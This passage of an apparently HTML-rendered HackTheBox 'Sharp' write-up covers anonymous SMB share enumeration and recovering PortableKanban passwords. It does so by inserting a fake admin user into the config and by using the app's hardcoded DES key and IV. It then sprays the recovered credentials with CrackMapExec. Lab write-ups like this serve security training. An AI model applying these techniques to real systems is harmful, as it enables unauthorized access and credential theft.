+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/opt/CrackMapExec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -M spider_plus 
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:SHARP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:Sharp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sharp&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED 
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started spidering plus with option:
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        DIR: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print$&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        EXT: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ico&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lnk&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;       SIZE: &lt;span style=&#34;color:#ae81ff&#34;&gt;51200&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     OUTPUT: /tmp/cme_spider_plus
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So organized, isn&amp;rsquo;t it?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;These are all the items we can enumerate with a null-session.&lt;/p&gt;
+&lt;h2 id=&#34;kanban-share-files&#34;&gt;Kanban share files&lt;/h2&gt;
+&lt;p&gt;Using smbclient to connect to &lt;code&gt;kanban&lt;/code&gt; directory on remote machine and download files back to our Linux.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Connect to remote host with null credentials&lt;/span&gt;
+$ smbclient -N //10.10.10.219/kanban
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Download all existing files&lt;/span&gt;
+smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; mget *
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You might want to take a look at those &lt;code&gt;.pk3&lt;/code&gt; and &lt;code&gt;PortableKanban.exe&lt;/code&gt; files as aforementioned, they are likely to contain useful information.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After downloading, you can extract the &lt;code&gt;pkb.zip&lt;/code&gt; using &lt;code&gt;unzip&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/Sharp/smb/kanban/pkb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# unzip pkb.zip     
+Archive:  pkb.zip
+  inflating: CommandLine.dll         
+  inflating: CsvHelper.dll           
+  inflating: DotNetZip.dll           
+  inflating: Itenso.Rtf.Converter.Html.dll  
+  inflating: Itenso.Rtf.Interpreter.dll  
+  inflating: Itenso.Rtf.Parser.dll   
+  inflating: Itenso.Sys.dll          
+  inflating: MsgReader.dll           
+  inflating: Ookii.Dialogs.dll       
+   creating: Plugins/
+  inflating: Plugins/PluginsLibrary.dll  
+  inflating: PortableKanban.Data.dll  
+  inflating: PortableKanban.exe      
+  inflating: PortableKanban.Extensions.dll  
+  inflating: ServiceStack.Common.dll  
+  inflating: ServiceStack.Interfaces.dll  
+  inflating: ServiceStack.Redis.dll  
+  inflating: ServiceStack.Text.dll   
+  inflating: User Guide.pdf
+  
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HackTheBox/Sharp/smb/kanban&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ md5sum PortableKanban.pk*
+0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
+0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
+02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
+   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Skim through the files and we have these users in &lt;code&gt;PortableKanban.pk3&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;PortableKanban.pk&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
+  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Users&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; [
+    {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e8e29158d70d44b1a1ba4949d52790a0&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Administrator&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Initials&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;EncryptedPassword&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;k+iUoOvQYG98PuhhRC7/rg==&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// Base64
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Inactive&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;TimeStamp&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;637409769245503700&lt;/span&gt;
+    },
+    {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0628ae1de5234b81ae65c246dd2b4a21&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lars&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Initials&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;EncryptedPassword&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ua3LyPFM175GN8D3+tqwLA==&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Inactive&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;TimeStamp&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;637409769265925600&lt;/span&gt;
+    }
+  ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reveal-administrator-password-by-re-configurating-kanban-pk3-file&#34;&gt;Reveal administrator password by re-configurating Kanban PK3 file&lt;/h3&gt;
+&lt;p&gt;Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own &lt;code&gt;PortableKanban.exe&lt;/code&gt; to decrypt passwords for us since they are stored offline but you&amp;rsquo;ve might already known that only privileged users can read the password in plain text. Let&amp;rsquo;s add ourselves in with &lt;em&gt;Admin&lt;/em&gt; role by copy-paste &lt;code&gt;Administrator&lt;/code&gt; section and change the name and id.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;PortableKanban.pk&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Users&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; [
+    {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e8e29158d70d44b1a1ba4949d52790a0&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Administrator&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Initials&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;EncryptedPassword&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;k+iUoOvQYG98PuhhRC7/rg==&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Inactive&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;TimeStamp&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;637409769245503700&lt;/span&gt;
+    },
+    {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0628ae1de5234b81ae65c246dd2b4a21&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lars&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Initials&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;EncryptedPassword&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ua3LyPFM175GN8D3+tqwLA==&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Inactive&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;TimeStamp&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;637409769265925600&lt;/span&gt;
+    },
+    {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e8e29158d70d44b1a1ba4949d52790a1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// We also have to change the id
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;huy&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Initials&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;EncryptedPassword&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, 					&lt;span style=&#34;color:#75715e&#34;&gt;// Empty password
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Inactive&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;TimeStamp&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;637409769245503700&lt;/span&gt;
+    }
+  ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we execute &lt;code&gt;PortableKanban.exe&lt;/code&gt;, open Users tab in the setup dialog and we are now able to read the passwords.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;alternative-method&#34;&gt;Alternative method&lt;/h3&gt;
+&lt;p&gt;If you love doing thing &lt;em&gt;the-hard-way&lt;/em&gt;, feel free to reverse the program and reproduce its decrypt method. Luckily, &lt;code&gt;PortableKanban.exe&lt;/code&gt; and its components are compiled in C# which makes it easier for us.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;finding-credentials-with-dnspy&#34;&gt;Finding credentials with dnSpy&lt;/h4&gt;
+&lt;p&gt;Load the target&amp;rsquo;s executables and DLLs  in dnSpy, we can have their decrypt method. The &lt;code&gt;Decrypt&lt;/code&gt; function reads encrypted string as input, then uses &lt;code&gt;DESCryptoServiceProvider&lt;/code&gt; with hardcoded key and IV to decrypt our string.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png&#34; alt=&#34;Crypto.Decrypt&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On line 62 and 65, from two magic bytes called &lt;code&gt;_rgbKey&lt;/code&gt; and &lt;code&gt;_rgbIV&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Token: 0x04000001 RID: 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] &lt;span style=&#34;color:#ae81ff&#34;&gt;_&lt;/span&gt;rgbKey = Encoding.ASCII.GetBytes(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;7ly6UznJ&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Hex: 376c7936557a6e4a
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#75715e&#34;&gt;// Token: 0x04000002 RID: 2
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] &lt;span style=&#34;color:#ae81ff&#34;&gt;_&lt;/span&gt;rgbIV = Encoding.ASCII.GetBytes(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XuVUm5fR&amp;#34;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// Hex: 587556556d356652
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Talk a little about DES cipher, people use two common mode which are CBC (&lt;strong&gt;cipher block chaining&lt;/strong&gt;) and ECB (&lt;strong&gt;electronic code book&lt;/strong&gt;). But only CBC supports key and IV in combination to generate the block cipher.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png&#34; alt=&#34;Source: Wikipedia&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So we are able to decrypt the password using &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt; with the following recipe will give us our plain password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;credentials-spraying-with-cme&#34;&gt;Credentials spraying with CME&lt;/h3&gt;
+&lt;p&gt;In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# users.txt                   &lt;/span&gt;
+lars
+Administrator
+                                                                                                    
+&lt;span style=&#34;color:#75715e&#34;&gt;# passwords.txt &lt;/span&gt;
+G123HHrth234gRG
+G2@$btRSHJYTarg
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/opt/CrackMapExec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt 
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:SHARP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:Sharp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sharp&lt;span style=&#34;color:#ae81ff&#34;&gt;\l&lt;/span&gt;ars:G123HHrth234gRG 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only &lt;code&gt;lars&lt;/code&gt; can log in so we should excluded Administrator credentials for now.&lt;/p&gt;
+&lt;h3 id=&#34;credentials-acquired&#34;&gt;Credentials acquired&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Username&lt;/th&gt;
+&lt;th&gt;Password&lt;/th&gt;
+&lt;th&gt;Status&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Administrator&lt;/td&gt;
+&lt;td&gt;G2@$btRSHJYTarg&lt;/td&gt;
+&lt;td&gt;Invalid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;lars&lt;/td&gt;
+&lt;td&gt;G123HHrth234gRG&lt;/td&gt;
+&lt;td&gt;Valid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;user-level-access&#34;&gt;User-level access&lt;/h2&gt;
+&lt;p&gt;After using &lt;code&gt;lars&lt;/code&gt; credentials, we are able to crawl his shared-objects with &lt;code&gt;spider_plus&lt;/code&gt; module as following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/opt/CrackMapExec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ⨯
